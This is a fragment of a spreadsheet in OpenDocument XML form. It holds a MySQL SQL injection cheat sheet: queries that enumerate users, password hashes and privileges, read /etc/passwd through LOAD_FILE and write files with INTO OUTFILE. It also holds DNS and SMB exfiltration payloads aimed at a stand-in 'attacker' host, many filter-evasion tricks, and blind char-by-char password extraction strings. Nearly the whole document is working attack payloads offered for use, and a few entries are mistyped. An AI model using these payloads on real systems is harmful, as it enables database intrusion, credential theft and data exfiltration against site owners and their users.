          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Version</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT @@version</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Comments</text:p>
            <text:p>/*! */ is special MySQL, execute in MySQL only</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT 1; #comment</text:p>
            <text:p>SELECT /*comment*/1;</text:p>
            <text:p>/*! MYSQL Special SQL */ (M) </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro16">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Current User</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT user();</text:p>
            <text:p>AND user() LIKE 'root</text:p>
            <text:p>AND MID((user()),1,1)&gt;'m #etc etc brute</text:p>
            <text:p>SELECT system_user();</text:p>
            <text:p>SELECT current_user,null</text:p>
            <text:p>current_user()</text:p>
            <text:p>session_user()</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List Users (priv)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT user FROM mysql.user;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List Password Hashes (priv)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT host, user, password FROM mysql.user;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro5">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List Privileges (priv) (note FROM)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges; </text:p>
            <text:p/>
            <text:p>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p>
            <text:p/>
            <text:p>SELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges; — list privs on databases (schemas)SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>List DBA Accounts (priv)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = ‘SUPER’;SELECT host, user FROM mysql.user WHERE Super_priv = ‘Y’; </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Current DB</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT database()</text:p>
            <text:p>Schema()</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List Databases</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT schema_name FROM information_schema.schemata;</text:p>
            <text:p>SELECT distinct(db) FROM mysql.db</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List Columns</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List Tables</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>ELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema ! = ‘information_schema’</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List Table/Column Names</text:p>
            <text:p><text:a xlink:href="../../../Source,%20should%20get%20the%20current%20table%20and%20column%20names" xlink:type="simple">Source</text:a>, should get the current table and column names</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>PROCEDURE ANALYSE()</text:p>
            <text:p>LIMIT (1 . . n),1 PROCEDURE ANALYSE() </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Find Tables from Column Name</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = ‘username’; </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Select Nth Row numbered from 0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 0;</text:p>
            <text:p>SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 1; </text:p>
            <text:p/>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Select Nth Char</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT substr(‘abcd’, 3, 1); # returns c</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">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65);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4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Casting</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT cast(’1′ AS unsigned integer);</text:p>
            <text:p>SELECT cast(’123′ AS char);</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">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CONCAT(‘A’,'B’); #returns AB</text:p>
            <text:p>SELECT CONCAT(‘A’,'B’,'C’); # returns ABC</text:p>
            <text:p>CONCAT_WS()</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IF Statement</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT if(1=1,’foo’,'bar’); — returns ‘foo’</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Case Statement</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT CASE WHEN (1=1) THEN ‘A’ ELSE ‘B’ END; # returns A</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Avoiding Quotes (hex)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT 0×414243; # returns ABC</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Time Delay BENCHMARK(times,do)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT BENCHMARK(1000000,MD5(‘A’)); </text:p>
            <text:p>SELECT SLEEP(5); # &gt;= 5.0.12</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Command Exec (if mysqld &lt;5.0, running as root, and you compromise a DBA account)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>raptor_udf.c</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro18">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Local file access (priv)</text:p>
            <text:p>    File must be located on the server host.</text:p>
            <text:p>    The basedirectory for LOAD_FILE() is @@datadir .</text:p>
            <text:p>    The file must be readable by the MySQL user.</text:p>
            <text:p>    The file size must be less than max_allowed_packet.</text:p>
            <text:p>    The default size for @@max_allowed_packet is 1047552 bytes.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>UNION ALL SELECT LOAD_FILE(‘/etc/passwd’)</text:p>
            <text:p>SELECT * FROM mytable INTO dumpfile ‘/tmp/somefile’; </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Hostname, IP address</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT @@hostname;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Server MAC address</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>UUID()</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Create users (priv)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>CREATE USER test1 IDENTIFIED BY ‘pass1′;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Delete users (priv)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>DROP USER test1;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Make user DBA (priv)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GRANT ALL PRIVILEGES ON *.* TO test1@’%';</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Location of DB files</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT @@datadir;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>DNS Requests</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT LOAD_FILE(CONCAT('\\\\foo.',(select MID(version(),1,1)),'.attacker.com\\'));</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SMB Rrequests</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>' OR 1=1 INTO OUTFILE '\\\\attacker\\SMBshare\\output.txt</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Default/System Databases</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>information_schema (&gt;= mysql 5.0)</text:p>
            <text:p>Mysql</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro19">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Information_schema tables</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>CHARACTER_SETS</text:p>
            <text:p>COLLATIONS</text:p>
            <text:p>COLLATION_CHARACTER_SET_APPLICABILITY</text:p>
            <text:p>COLUMNS</text:p>
            <text:p>COLUMN_PRIVILEGES</text:p>
            <text:p>ENGINES</text:p>
            <text:p>EVENTS</text:p>
            <text:p>FILES</text:p>
            <text:p>GLOBAL_STATUS and SESSION_STATUSs</text:p>
            <text:p>GLOBAL_VARIABLES and SESSION_VARIABLESs</text:p>
            <text:p>KEY_COLUMN_USAGE</text:p>
            <text:p>OPTIMIZER_TRACE</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro20">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Information_schema tables continued</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T3">PARAMETERS</text:span></text:p>
            <text:p><text:span text:style-name="T3">PARTITIONS</text:span></text:p>
            <text:p><text:span text:style-name="T3">PLUGINS</text:span></text:p>
            <text:p><text:span text:style-name="T3">PROCESSLIST</text:span></text:p>
            <text:p><text:span text:style-name="T3">PROFILING</text:span></text:p>
            <text:p><text:span text:style-name="T3">REFERENTIAL_CONSTRAINTS</text:span></text:p>
            <text:p><text:span text:style-name="T3">ROUTINES</text:span></text:p>
            <text:p><text:span text:style-name="T3">SCHEMATA</text:span></text:p>
            <text:p><text:span text:style-name="T3">SCHEMA_PRIVILEGES</text:span></text:p>
            <text:p><text:span text:style-name="T3">STATISTICS</text:span></text:p>
            <text:p><text:span text:style-name="T3">TABELS</text:span></text:p>
            <text:p><text:span text:style-name="T3">TABLESPACES</text:span></text:p>
            <text:p><text:span text:style-name="T3">TABLE_CONSTRAINTS</text:span></text:p>
            <text:p><text:span text:style-name="T3">TABLE_PRIVILEGES</text:span></text:p>
            <text:p><text:span text:style-name="T3">TRIGGERS</text:span></text:p>
            <text:p><text:span text:style-name="T3">USER_PRIVILEGES</text:span></text:p>
            <text:p><text:span text:style-name="T3">VIEWS</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro20">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mysql table</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>user</text:p>
            <text:p>Db</text:p>
            <text:p>tables_priv</text:p>
            <text:p>columns_priv</text:p>
            <text:p>procs_priv</text:p>
            <text:p>proxies_priv</text:p>
            <text:p>Event</text:p>
            <text:p>Func</text:p>
            <text:p>Plugin</text:p>
            <text:p>Proc</text:p>
            <text:p>general_log</text:p>
            <text:p>slow_log</text:p>
            <text:p>help_category</text:p>
            <text:p>help_keyword</text:p>
            <text:p>help_relation</text:p>
            <text:p>help_topic</text:p>
            <text:p/>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro21">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mysql table continued</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T3">time_zone</text:span></text:p>
            <text:p><text:span text:style-name="T3">time_zone_leap_second</text:span></text:p>
            <text:p><text:span text:style-name="T3">time_zone_name</text:span></text:p>
            <text:p><text:span text:style-name="T3">time_zone_transition</text:span></text:p>
            <text:p><text:span text:style-name="T3">time_zone_transition_type</text:span></text:p>
            <text:p><text:span text:style-name="T3">gtid_executed</text:span></text:p>
            <text:p><text:span text:style-name="T3">ndb_binlog_index</text:span></text:p>
            <text:p><text:span text:style-name="T3">slave_master_info</text:span></text:p>
            <text:p><text:span text:style-name="T3">slave_relay_log_info</text:span></text:p>
            <text:p><text:span text:style-name="T3">slave_worker_info</text:span></text:p>
            <text:p><text:span text:style-name="T3">innodb_index_stats</text:span></text:p>
            <text:p><text:span text:style-name="T3">innodb_table_stats</text:span></text:p>
            <text:p><text:span text:style-name="T3">server_cost</text:span></text:p>
            <text:p><text:span text:style-name="T3">engine_cost</text:span></text:p>
            <text:p><text:span text:style-name="T3">audit_log_filter</text:span></text:p>
            <text:p><text:span text:style-name="T3">audit_log_user</text:span></text:p>
            <text:p><text:span text:style-name="T3">firewall_users</text:span></text:p>
            <text:p><text:span text:style-name="T3">firewall_whitelist</text:span></text:p>
            <text:p><text:span text:style-name="T3">Servers</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1" table:number-rows-repeated="2">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1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Most of these techniques are already scattered throughout </text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro16">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Insert newline to break up query. Combination of comments and newline</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1'#</text:p>
            <text:p>AND 0--</text:p>
            <text:p>UNION# I am a comment!</text:p>
            <text:p>SELECT@tmp:=table_name x FROM--</text:p>
            <text:p>`information_schema`.tables LIMIT 1#</text:p>
            <text:p/>
            <text:p>1'%23%0AAND 0--%0AUNION%23 I am a comment!%0ASELECT@tmp:=table_name x FROM--%0A`information_schema`.tables LIMIT 1%23</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Insert a bunch of comments and junk spaces</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>VERSION/**/%A0 (/*comment*/)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Filtering on White spaces using paranthesis</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>(1)and(1)=(0)union(select(null),table_name,(null)from(information_schema.tables)limit 28,1-- -)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Filtering on White spaces using paranthesis, substr, mid</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>(1)and(1)=(0)union(select(null),mid(group_concat(table_name),600,100),(null)from(information_schema.tables))#</text:p>
            <text:p/>
            <text:p>(1)and(1)=(0)union(select(null),group_concat(column_name),(null)from(information_schema.columns)where(table_name)=(0x7573657273))#</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro22">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Basic filtering on ‘and’, ‘null’, ‘where’, and ‘limit’.</text:p>
            <text:p>Use &amp;&amp; instead of AND</text:p>
            <text:p>Use || instead of OR</text:p>
            <text:p>%00 instead of # or –</text:p>
            <text:p>HAVING and LIKE help out where possible</text:p>
            <text:p>Cannot use group_concat while using HAVING</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>(0)union(select(0),group_concat(table_name),(0)from(information_schema.tables))#</text:p>
            <text:p/>
            <text:p>(0)union(select(0),group_concat(column_name),(0)from(information_schema.columns))#</text:p>
            <text:p/>
            <text:p>(0)union(select(0),group_concat(schema_name),(0)from(information_schema.schemata))#</text:p>
            <text:p/>
            <text:p>(0)union(select(table_schema),table_name,(0)from(information_schema.tables)having((table_schema)like(0x74657374)))#</text:p>
            <text:p/>
            <text:p>(0)union(select(table_schema),table_name,(0)from(information_schema.tables)having((table_schema)like(0x74657374)&amp;&amp;(table_name)!=(0x7573657273)))#</text:p>
            <text:p/>
            <text:p>(0)union(select(table_name),column_name,(0)from(information_schema.columns)having((table_name)like(0x7573657273)))#</text:p>
            <text:p/>
            <text:p>(0)union(select(table_name),column_name,(0)from(information_schema.columns)having((table_name)like(0x7573657273)&amp;&amp;(column_name)!=(0x6964)))#</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>More filtering, previous plus ‘having’, ‘group_concat’, ‘union select’</text:p>
            <text:p>can’t output file without union select</text:p>
            <text:p>If file priv, load_file. Check for load_file without null using coalesce</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>(coalesce(length(load_file(0x2F6574632F706173737764)),1))</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Brute reading file char by char using case</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>(case(mid(load_file(0x2F6574632F706173737764),$x,1))when($char)then(1)else(0)end)</text:p>
            <text:p/>
            <text:p>(while $char is the character in sql hex which is compared to the current character of the file at offset $x)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Check char of pass, one by one (or with a specific username)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>1&amp;&amp;mid(pass,1,1)=(0x61);%00</text:p>
            <text:p>1||1=1&amp;&amp;name=0x61646D696E&amp;&amp;mid(pass,1,1)=0x61;%00</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>More filtering, including “=”, use LIKE instead</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1&amp;&amp;(name)like(0x61646D696E)&amp;&amp;(mid(pass,1,1))like(0x61);%00</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Filtering AND and “&amp;&amp;”, use IF statements</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>if((name)like(0x61646D696E),1,0);%00</text:p>
            <text:p>if((name)like(0x61646D696E),id,0);%00</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro13">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Check password chars if AND and &amp;&amp; and more are filtered</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>if(if((name)like(0x61646D696E),1,0),if(mid((password),1,1)like(0x61),id,0),0);%00</text:p>
            <text:p/>
            <text:p>if(</text:p>
            <text:p>  // if (it gets true if the name='admin')</text:p>
            <text:p>    if((name)like(0x61646D696E),1,0),</text:p>
            <text:p>  // then (if first password char='a' return admin id, else 0)</text:p>
            <text:p>    if(mid((password),1,1)like(0x61),id,0),</text:p>
            <text:p>  // else (return 0)</text:p>
            <text:p>    0</text:p>
            <text:p>);%00</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro18">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Unicode <text:a xlink:href="http://dev.mysql.com/doc/refman/5.1/en/charset-unicode-sets.html" xlink:type="simple">(see more)</text:a></text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT 'Ä'='A'; #1</text:p>
            <text:p>SELECT 'Ã'='A'; #1</text:p>
            <text:p/>
            <text:p>SELECT * FROM test WHERE name = 'ädM&amp;#1031;&amp;#328;'; //imagine entities in canonical form</text:p>
            <text:p/>
            <text:p>SELECT*FROM(test)WHERE(name)IN(_ucs2 0x01df010e004d00cf0148);</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>XML SQLi</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Version detection using MySQL Special Exec Comment Syntax</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT--/*!500005#*//*!400004#*//*!300003#*/</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>CONCAT, CHARS, and HEX</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT concat(char(0x70617373),char(2003792484))</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>No quotes (use HEX and CHAR)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT * FROM Users WHERE username = 0x61646D696E</text:p>
            <text:p>SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>String separation / Comment obfuscation</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT/*/'a'/*/ 'd'/*/ 'mi'/*/ 'n'</text:p>
            <text:p><text:span text:style-name="T3">1 o/**/r 1=1 A/**/ND user L/**/IKE "%root%"</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro6">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a' 'd' 'mi' 'n';</text:p>
            <text:p>SELECT CONCAT('a', 'd', 'm', 'i', 'n');</text:p>
            <text:p>SELECT CONCAT_WS('', 'a', 'd', 'm', 'i', 'n');</text:p>
            <text:p>SELECT GROUP_CONCAT('a', 'd', 'm', 'i', 'n');</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>OR, AND, UNION</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>‘ and (select pass from users limit 1)=’secret</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>OR, AND, UNION, LIMIT</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>‘ and (select pass from users where id =1)=’a</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>OR, AND, UNION, LIMIT, WHERE</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>‘ and (select pass from users group by id having id = 1)=’a</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>OR, AND, UNION, LIMIT, WHERE, GROUP</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>‘ and length((select pass from users having substr(pass,1,1)=’a'))</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>OR, AND, UNION, LIMIT, WHERE, GROUP, HAVING</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>‘ and (select substr(group_concat(pass),1,1) from users)=’a</text:p>
            <text:p>‘ and substr((select max(pass) from users),1,1)=’a</text:p>
            <text:p>‘ and substr((select max(replace(pass,’lastpw’,”)) from users),1,1)=’a</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>OR, AND UNION, LIMIT, WHERE, GROUP, HAVING, SELECT</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>‘ and substr(load_file(‘file’),locate(‘DocumentRoot’,(load_file(‘file’)))+length(‘DocumentRoot’),10)=’a</text:p>
            <text:p>‘=” into outfile ‘/var/www/dump.txt</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>OR, AND, UNION, LIMIT, WHERE, GROUP, HAVING, SELECT, FILE</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>‘ procedure analyse()#</text:p>
            <text:p>‘-if(name=’Admin’,1,0)#</text:p>
            <text:p>‘-if(if(name=’Admin’,1,0),if(substr(pass,1,1)=’a',1,0),0)#</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro5">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Certain encodings might be useful</text:p>
            <text:p>URL</text:p>
            <text:p>Double URL</text:p>
            <text:p>Unicode</text:p>
            <text:p>Invalid Hex (ASP)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p/>
            <text:p>SELECT %74able_%6eame FROM information_schema.tables;</text:p>
            <text:p>SELECT %2574able_%256eame FROM information_schema.tables;</text:p>
            <text:p>SELECT %u0074able_%u6eame FROM information_schema.tables;</text:p>
            <text:p>SELECT %tab%le_%na%me FROM information_schema.tables;</text:p>
          </table:table-cell>
        </table:table-row>
